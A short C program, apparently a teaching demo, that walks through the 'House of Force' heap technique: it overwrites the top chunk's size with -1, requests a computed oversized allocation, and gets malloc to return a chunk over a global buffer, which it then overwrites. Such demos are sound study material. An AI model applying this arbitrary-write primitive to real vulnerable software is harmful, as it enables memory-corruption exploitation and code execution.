#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>

char bss_var[] = "AAAAAAAAAAAAAAAA";

int main() {
	fprintf(stderr, "target variable: %p => %s\n", bss_var, bss_var);

	intptr_t *p1 = malloc(0x30);
	intptr_t *top_ptr = (intptr_t *) ((char *)p1 + 0x30);
	fprintf(stderr, "\nthe first chunk: %p, size: %#llx\n", (char *)p1 - 0x10, *((unsigned long long int *)((char *)p1 - 8)));
	fprintf(stderr, "the top chunk: %p, size: %#llx\n", top_ptr, *((unsigned long long int *)((char *)top_ptr + 8)));

	*(intptr_t *)((char *)top_ptr + 8) = -1;
	fprintf(stderr, "\noverwrite the top chunk size with a big value: %#llx\n", *((unsigned long long int *)((char *)top_ptr + 8)));

	unsigned long evil_size = (unsigned long)bss_var - (unsigned long)top_ptr - 0x10*2;
	fprintf(stderr, "\n%p - %p - 0x10*2 = %#lx\n", bss_var, top_ptr, evil_size);
	void *evil_ptr = malloc(evil_size);
	fprintf(stderr, "malloc(%#lx): %p\n", evil_size, (char *)evil_ptr - 0x10);
	fprintf(stderr, "the new top chunk: %p\n", (char *)evil_ptr + evil_size);

	void *ctr_chunk = malloc(0x30);
	strcpy(ctr_chunk, "BBBBBBBBBBBBBBBB");
	fprintf(stderr, "\nmalloc to target buffer: %p\n", ctr_chunk - 0x10);
	fprintf(stderr, "overwrite the variable: %p => %s\n", bss_var, bss_var);
}
